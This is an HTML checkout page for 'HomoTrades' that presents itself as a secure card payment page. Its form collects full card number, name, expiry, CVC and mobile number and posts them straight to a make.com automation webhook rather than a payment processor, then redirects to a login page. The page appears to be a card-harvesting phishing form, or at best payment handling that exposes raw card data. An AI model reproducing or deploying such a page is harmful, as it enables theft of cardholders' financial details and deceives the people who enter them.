<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HomoTrades Payment Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="checkout-container">
        <form class="checkout-form" action="https://hook.eu2.make.com/sjjfr69yy5kjb4d2iafyc8f32f49au1p" method="POST" id="checkout-form">
            <input type="hidden" id="redirect" name="redirect" value="https://homotraders.com/auth">
            <h2>HomoTrades</h2>
            <p class="subtitle">Card Payment Secure Page</p>
            <p class="amount" id="payment-amount">Amount: INR 0</p>
            <div class="form-group">
                <label for="card-name">Name on Card</label>
                <input type="text" id="card-name" name="card_name" required>
                <small class="error-message" id="card-name-error"></small>
            </div>
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" name="card_number" maxlength="19" required>
                <small class="error-message" id="card-number-error"></small>
            </div>
            <div class="form-group">
                <div class="form-row">
                    <div class="form-group">
                        <label for="expiry-date">Expiry Date</label>
                        <input type="text" id="expiry-date" name="expiry_date" placeholder="MM/YY" maxlength="5" required>
                        <small class="error-message" id="expiry-date-error"></small>
                    </div>
                    <div class="form-group">
                        <label for="cvc">CVC</label>
                        <input type="text" id="cvc" name="cvc" maxlength="4" required>
                        <small class="error-message" id="cvc-error"></small>
                    </div>
                    <div class="form-group">
                        <label for="mobile-number">Mobile Number</label>
                        <input type="text" id="mobile-number" name="mobile_number" maxlength="10" required>
                        <small class="error-message" id="mobile-number-error"></small>
                    </div>
                </div>
            </div>
            <button type="submit">Pay Now</button>
        </form>
        <footer class="footer">
            HomoTrades 2017 - 2024 &copy; Copyright <br>
            <strong>4.2 % Card Gateway Charges are applied for both Credit/Debit Cards</strong>
        </footer>
    </div>
    <script src="validation.js"></script>
    <script src="amount.js"></script>
</body>
</html>
